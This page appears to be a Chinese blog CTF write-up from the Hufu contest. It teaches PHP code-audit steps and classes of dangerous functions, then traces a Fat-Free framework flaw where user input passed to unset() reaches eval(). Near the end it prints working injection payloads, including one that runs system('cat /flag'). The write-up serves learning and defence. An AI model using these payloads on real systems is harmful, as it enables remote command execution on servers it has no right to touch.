@@ -1,0 +1,143 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.1" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.1" type="image/png" sizes="32x32"><meta name="description" content="前言       赛后复现学习学习，今天主要学习一下通过审计构造注入语句">
+<meta property="og:type" content="article">
+<meta property="og:title" content="虎符比赛wp——fat free框架注入漏洞审计学习">
+<meta property="og:url" content="http://example.com/2021/04/04/%E7%BA%A2%E8%B0%B7%E6%9D%AF-%E8%99%8E%E7%AC%A6%E6%AF%94%E8%B5%9Bwp/index.html">
+<meta property="og:site_name" content="Tlife">
+<meta property="og:description" content="前言       赛后复现学习学习，今天主要学习一下通过审计构造注入语句">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172220.jpeg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172317.jpeg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172439.jpeg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172517.jpeg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172554.jpeg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404173536.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404173601.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174325.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174326.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174327.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174527.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404175221.png">
+<meta property="article:published_time" content="2021-04-04T06:52:04.000Z">
+<meta property="article:modified_time" content="2021-04-04T11:10:20.527Z">
+<meta property="article:author" content="vague huang">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172220.jpeg"><title>虎符比赛wp——fat free框架注入漏洞审计学习 | Tlife</title><link ref="canonical" href="http://example.com/2021/04/04/%E7%BA%A2%E8%B0%B7%E6%9D%AF-%E8%99%8E%E7%AC%A6%E6%AF%94%E8%B5%9Bwp/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.1"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.2.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Tlife</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">虎符比赛wp——fat free框架注入漏洞审计学习</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-04-04</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-04-04</span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">Visited</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body">
+        <h2 id="前言">
+          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a>前言</h2>
+      <p>赛后复现学习学习，今天主要学习一下通过审计构造注入语句<a id="more"></a></p>
+
+        <h2 id="代码审计基本步骤">
+          <a href="#代码审计基本步骤" class="heading-link"><i class="fas fa-link"></i></a>代码审计基本步骤</h2>
+      <p><strong>入口文件——&gt;文件监控——&gt;正式审计</strong></p>
+
+        <h3 id="正式审计步骤">
+          <a href="#正式审计步骤" class="heading-link"><i class="fas fa-link"></i></a>正式审计步骤</h3>
+      <p>我把审计分为安装前和安装后两个部分，安装前审完了之后我们就可以开始看网站的其他文件是否存在漏洞了，这个时候一般分为两种审计方式：</p>
+<p>1.通过危险函数逆推是否用户可控<br>2.通读所有代码<br>3.黑盒+白盒</p>
+<p>我一般都会用第一种或者第二种方式，第一种方式能够快速的找到漏洞但是漏的可能会多，第二种方式一般用在规模比较小的cms，因为文件较少，所以代码全看了也花不了多少功夫，第三种我很少用，我觉得这是新手审计的缺点，其实更应该黑盒+白盒一起用的，因为在黑盒里我们可能可以发现一些看代码的时候不注意的漏洞，比如越权/逻辑等漏洞。</p>
+<ul>
+<li>分析源码目录</li>
+</ul>
+<p>我们在这个步骤只需要对源码目录有个大概的了解，知道每个目录里放的是什么文件就行了，比如install目录放的安装文件，admin目录放的后台管理相关的文件，function目录放的网站运行时需要用到的方法的相关文件等。</p>
+<ul>
+<li>分析过滤情况</li>
+</ul>
+<p>在这个步骤我们要对源码的过滤情况进行分析，看看是全局过滤还是单独写某个函数用于对输入点一个个的过滤。</p>
+
+        <h2 id="审计对象注意点">
+          <a href="#审计对象注意点" class="heading-link"><i class="fas fa-link"></i></a>审计对象注意点</h2>
+      
+        <h3 id="危险函数">
+          <a href="#危险函数" class="heading-link"><i class="fas fa-link"></i></a>危险函数</h3>
+      
+        <h4 id="五大特性">
+          <a href="#五大特性" class="heading-link"><i class="fas fa-link"></i></a>五大特性</h4>
+      <p>1.能够执行任意代码的函数<br>2.常见能够读取网络资源的函数<br>3.能够执行系统命令或者调用外部程序的函数<br>4.能够操作文件（读取、移动、删除）的函数<br>5.能修改运行时候的上下文环境（覆盖变量/函数）</p>
+
+        <h4 id="任意执行代码函数：">
+          <a href="#任意执行代码函数：" class="heading-link"><i class="fas fa-link"></i></a>任意执行代码函数：</h4>
+      <p>1.把传入的字符串当做php代码直接执行:</p>
+<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172220.jpeg" alt="img"></p>
+<p>2.引入文件执行php代码，php里引入文件执行代码的函数:</p>
+<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172317.jpeg" alt="img"><br>3.第3种是一些数据处理函数,它们存在支持<strong>回调函数</strong>类型的<strong>参数</strong>,这个参数可以传入<strong>函数的字符串名称</strong>,一旦这个参数可控,那么可能造成漏洞,这些函数的特征非常明显,参数类型是<strong>callback</strong>形式,审计的基本上就是看他们的回调函数是不是用<strong>字符串</strong>的形式传递,是否<strong>可控</strong>,在PHP里存在大量的这种函数,这里只举5个比较常见的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172439.jpeg" alt="img"></p>
+
+        <h4 id="能够执行系统命令或者调用外部程序的函数">
+          <a href="#能够执行系统命令或者调用外部程序的函数" class="heading-link"><i class="fas fa-link"></i></a>能够执行系统命令或者调用外部程序的函数</h4>
+      <p>能够执行系统命令或者调用外部程序的函数,这些函数使用不当容易引起命令注入,一般需要通常需要结合escapeshellcmd或escapeshellarg函数过滤传入的变量</p>
+<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172517.jpeg" alt="img"></p>
+
+        <h4 id="能够操作文件-读写-移动-删除-的函数">
+          <a href="#能够操作文件-读写-移动-删除-的函数" class="heading-link"><i class="fas fa-link"></i></a>能够操作文件(读写,移动,删除)的函数</h4>
+      <p>能够操作文件(读写,移动,删除)的函数,在审计的时候也要注意传入的变量是否可控,是否存在穿越目录,导致任意文件读写的情况</p>
+
+        <h4 id="能够修改运行时候的上下文环境-覆盖变量-函数">
+          <a href="#能够修改运行时候的上下文环境-覆盖变量-函数" class="heading-link"><i class="fas fa-link"></i></a>能够修改运行时候的上下文环境(覆盖变量/函数)</h4>
+      <p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404172554.jpeg" alt="img"></p>
+
+        <h2 id="实战">
+          <a href="#实战" class="heading-link"><i class="fas fa-link"></i></a>实战</h2>
+      <p>下载 fat-free框架源码，将题目换成源码</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line">$f3=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$f3-&gt;set(<span class="string">&#x27;DEBUG&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>($f3-&gt;$a);</span><br><span class="line"></span><br><span class="line">$f3-&gt;run();</span><br></pre></td></tr></table></div></figure>
+
+<p>这边包含了一个base.php文件，所以我直接去base.php中查看，搜索下看看有没有危险函数：在clear()方法中查找到eval函数，于是传入参数，直接定位到这里面看看<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404173536.png" alt="img" style="zoom:67%;"></p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var_dump($key);</span><br><span class="line">var_dump(<span class="keyword">$this</span>-&gt;compile(<span class="string">&#x27;@hive&#x27;</span>.$key,<span class="literal">FALSE</span>));</span><br><span class="line">$val=preg_replace(<span class="string">&#x27;/^(\$hive)/&#x27;</span>,<span class="string">&#x27;$this-&gt;hive&#x27;</span>,<span class="keyword">$this</span>-&gt;compile(<span class="string">&#x27;@hive.&#x27;</span>.$key,<span class="literal">FALSE</span>));</span><br><span class="line">var_dump(<span class="string">&#x27;unset(&#x27;</span>.$val.<span class="string">&#x27;);&#x27;</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;unset(&#x27;</span>.$val.<span class="string">&#x27;);&#x27;</span>);</span><br></pre></td></tr></table></div></figure>
+
+<p><strong>这里画个重点</strong>其实之前在学C原因的时候也有这样的调试方法，可能是太久没写代码了，都给忘了，真是无语哈哈哈<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404173601.png" alt="img" style="zoom:67%;"><br>可以看到输入内容，此时直接在url上构造payload即可</p>
+<p><strong>如果不定位的话：</strong></p>
+<p>断点打在get语句，直接步入跟踪：</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174325.png" alt="img" style="zoom:67%;">
+
+<p>原来这个unset函数重新定义了：</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174326.png" alt="img" style="zoom:67%;">
+
+<p>继续跟进:进入clear方法中：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174327.png" alt="img" style="zoom:67%;"></p>
+<p>key为我们传入的值 为cache就进入以下判断，看了一下 似乎没有对我们可以利用的函数：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404174527.png" alt="img" style="zoom:67%;"><br>到了eval函数这里：</p>
+<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210404175221.png" alt="img" style="zoom:67%;">
+
+<p>在这里进行正则匹配的过滤，但是看了一下其他的payload，说是有进行过滤，但是看了一下 发现没有呀，然后此时只需要对这里进行payload的构造就行了,整个流程还挺明确的，就是用户传入的值 会进入到clear()函数中，期间也没什么绕弯子的地方。。<br>接下来需要做的就是构造payload闭合前面的内容实现eval命令执行:</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;a[&#39;&#x2F;&#39;]);phpinfo(</span><br></pre></td></tr></table></div></figure>
+
+<p>由于后面会拼接回来一个);所以这里后面的内容可以不要，但是要执行其他命令要吧后面的内容给注释掉，所以payload为:</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxxxxxx ?a&#x3D;a[&#39;&#x2F;&#39;]);system(&#39;cat &#x2F;flag&#39;);&#x2F;&#x2F;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="小结">
+          <a href="#小结" class="heading-link"><i class="fas fa-link"></i></a>小结:</h2>
+      <p>关于收获：<br>1.对于调试其实已经不算陌生了，拿到题目获得源码后其实我是有点无从下手的，感觉是太久没调试手生了，通过这题，以后就要记得调试的基操了，尤其是通过<strong>输出各个变量</strong>确定我们输入的值，从而达到成功构造出闭合语句的效果</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://example.com">vague huang</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://example.com/2021/04/04/%E7%BA%A2%E8%B0%B7%E6%9D%AF-%E8%99%8E%E7%AC%A6%E6%AF%94%E8%B5%9Bwp/">http://example.com/2021/04/04/%E7%BA%A2%E8%B0%B7%E6%9D%AF-%E8%99%8E%E7%AC%A6%E6%AF%94%E8%B5%9Bwp/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2021/04/01/ssti%E6%B3%A8%E5%85%A5%E7%BB%AD/"><span class="paginator-prev__text">ssti注入续()</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">
+          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.</span> <span class="toc-text">
+          代码审计基本步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%BC%8F%E5%AE%A1%E8%AE%A1%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.1.</span> <span class="toc-text">
+          正式审计步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E5%AF%B9%E8%B1%A1%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">3.</span> <span class="toc-text">
+          审计对象注意点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">
+          危险函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E5%A4%A7%E7%89%B9%E6%80%A7"><span class="toc-number">3.1.1.</span> <span class="toc-text">
+          五大特性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="toc-number">3.1.2.</span> <span class="toc-text">
+          任意执行代码函数：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%83%BD%E5%A4%9F%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%88%96%E8%80%85%E8%B0%83%E7%94%A8%E5%A4%96%E9%83%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.3.</span> <span class="toc-text">
+          能够执行系统命令或者调用外部程序的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%83%BD%E5%A4%9F%E6%93%8D%E4%BD%9C%E6%96%87%E4%BB%B6-%E8%AF%BB%E5%86%99-%E7%A7%BB%E5%8A%A8-%E5%88%A0%E9%99%A4-%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.4.</span> <span class="toc-text">
+          能够操作文件(读写,移动,删除)的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%83%BD%E5%A4%9F%E4%BF%AE%E6%94%B9%E8%BF%90%E8%A1%8C%E6%97%B6%E5%80%99%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E7%8E%AF%E5%A2%83-%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F-%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.5.</span> <span class="toc-text">
+          能够修改运行时候的上下文环境(覆盖变量&#x2F;函数)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">4.</span> <span class="toc-text">
+          实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">
+          小结:</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/20210123130445.png" alt="avatar"></div><p class="sidebar-ov-author__text">tlife</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">75</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>vague huang</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.2.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.1</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">Visitors</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.1"></script><script src="/js/stun-boot.js?v=2.6.1"></script><script src="/js/scroll.js?v=2.6.1"></script><script src="/js/header.js?v=2.6.1"></script><script src="/js/sidebar.js?v=2.6.1"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
